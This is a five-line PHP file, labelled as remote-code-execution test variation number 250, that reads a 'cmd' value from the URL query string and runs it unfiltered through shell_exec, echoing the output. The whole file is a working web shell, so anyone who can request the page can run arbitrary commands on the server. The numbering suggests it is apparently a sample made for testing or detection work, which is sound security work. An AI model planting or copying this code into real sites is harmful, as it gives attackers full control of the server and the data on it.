<?php
// RCE test variation #250
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>